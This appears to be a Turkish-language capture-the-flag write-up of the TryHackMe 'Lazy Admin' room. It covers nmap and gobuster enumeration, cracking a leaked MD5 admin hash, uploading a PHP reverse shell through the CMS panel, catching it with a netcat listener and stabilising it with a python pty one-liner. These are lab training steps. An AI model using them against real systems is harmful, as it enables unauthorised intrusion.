---
title: Lazy Admin
date: 2024-03-02 12:13:12 
categories: [TryHackMe]
tags: [Easy,Security]
image: https://tryhackme-images.s3.amazonaws.com/room-icons/efbb70493ba66dfbac4302c02ad8facf.jpeg
---

 <a href="https://tryhackme.com/room/lazyadmin">Lazy Admin</a>


* * *
Öncelikle nmap taraması başlatalım.
```
┌──(root㉿r3tr0)-[~]
└─# nmap -T5 -v -sV  10.10.120.127
```
nmap çıktısı:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-12 13:52 EST
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 13:52
Scanning 10.10.120.127 [4 ports]
Completed Ping Scan at 13:52, 0.16s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:52
Completed Parallel DNS resolution of 1 host. at 13:52, 0.00s elapsed
Initiating SYN Stealth Scan at 13:52
Scanning 10.10.120.127 (10.10.120.127) [1000 ports]
Discovered open port 22/tcp on 10.10.120.127
Discovered open port 80/tcp on 10.10.120.127
Completed SYN Stealth Scan at 13:52, 1.66s elapsed (1000 total ports)
Initiating Service scan at 13:52
Scanning 2 services on 10.10.120.127 (10.10.120.127)
Completed Service scan at 13:52, 6.29s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.120.127.
Initiating NSE at 13:52
Completed NSE at 13:52, 0.41s elapsed
Initiating NSE at 13:52
Completed NSE at 13:52, 0.37s elapsed
Nmap scan report for 10.10.120.127 (10.10.120.127)
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds
           Raw packets sent: 1108 (48.728KB) | Rcvd: 1105 (44.208KB)
```
22 ssh ve 80 http servisi açık. Websitesine göz atalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a1.png?raw=true)

Sıradan bir ubuntu default sayfası.

Gobuster çalıştırarak gizli dizinleri arayalım.

```
┌──(root㉿r3tr0)-[~]
└─# gobuster dir -u http://10.10.120.127 -w  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html
```
gobuster çıktısı:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.120.127
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 11321]
/.html                (Status: 403) [Size: 278]
/content              (Status: 301) [Size: 316] [--> http://10.10.120.127/content/]
Progress: 10236 / 882244 (1.16%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10276 / 882244 (1.16%)
===============================================================
Finished
===============================================================
```
Bulduğumuz content dizinin içinde de gobuster çalıştırıyorum.
```
┌──(root㉿r3tr0)-[~]
└─# gobuster dir -u http://10.10.120.127/content -w  /usr/share/wordlists/dirb/common.txt 
```
gobuster çıktısı:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.120.127/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/_themes              (Status: 301) [Size: 324] [--> http://10.10.120.127/content/_themes/]
/as                   (Status: 301) [Size: 319] [--> http://10.10.120.127/content/as/]
/attachment           (Status: 301) [Size: 327] [--> http://10.10.120.127/content/attachment/]
/images               (Status: 301) [Size: 323] [--> http://10.10.120.127/content/images/]
/inc                  (Status: 301) [Size: 320] [--> http://10.10.120.127/content/inc/]
/index.php            (Status: 200) [Size: 2199]
/js                   (Status: 301) [Size: 319] [--> http://10.10.120.127/content/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
İncelenecek çok daha fazla dizin bulduk. Her dizini tek tek gezdim ve sadece 2 tanesini ilginç buldum.

Bunlardan ilki giriş formu olan ‘/as’:

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a2.png?raw=true)

Şimdilik giriş bilgilerine sahip değiliz. Diğer dizine geçelim.

'/inc':

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a3.png?raw=true)

Çok fazla dosya var. Biraz inceleme yaptığımda kayda değer bir bilgi buluyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a4.png?raw=true)

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a5.png?raw=true)

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a6.png?raw=true)

Kullanıcı adının manager olduğunu görüyoruz. Şifreyi hash olarak görünüyor kırmamız gerekecek.

- manager
- 42f749ade7f9e195bf475f37a44cafcb

Bu bir md5 hash'i [md5hashing](https://md5hashing.net/hash/md5) websitesine gidip hash'i kırıyorum.

- 42f749ade7f9e195bf475f37a44cafcb:Password123

Kullanıcı adı ve şifreyi bildiğimize göre bulduğumuz diğer bir dizin olan "/as" dizinine giderek giriş yapalım.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a7.png?raw=true)

Php reverse shell kodu ekliyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a11.png?raw=true)


content/inc/ads klasörüne gittiğimde shellimi görebiliyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a8.png?raw=true)


Başlatmadan önce netcat çalıştıralım.

- nc -nvlp 1234

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a9.png?raw=true)


Makineye giriş yapmayı başardık.

- python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ ile shellimizi stabil hale getirelim.

user bayrağını /home/itguy içinde buluyorum.

![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/LazyAdmin/images/a10.png?raw=true)


![fsoc](/images/fsoc.gif)
